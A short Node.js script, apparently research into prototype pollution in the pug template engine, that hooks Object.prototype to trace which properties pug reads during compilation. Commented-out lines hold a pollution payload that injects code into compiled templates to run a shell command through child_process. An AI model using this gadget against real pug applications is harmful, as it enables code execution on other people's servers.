pug = require("pug")

/* Payload Injection*/
// inject property to root prototype
// Object.prototype.asString = '1';
// Object.prototype.name = '2';
// Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`touch ./attack.txt`).toString()}}//"

currProp = 'block';
Object.defineProperty(
    Object.prototype, 
    currProp, { 
      get: function() { 
        if(this[currProp + "cs"]){
            return this[currProp + "cs"]; 
        }
        else{
            console.log("block has been visited!");
        }
        return undefined; 
      }, 
      set: function(val){ 
        this[currProp + "cs"] = val;
      } 
    }
  );

const template = pug.compile(`h1= msg`);

console.log(template.toString());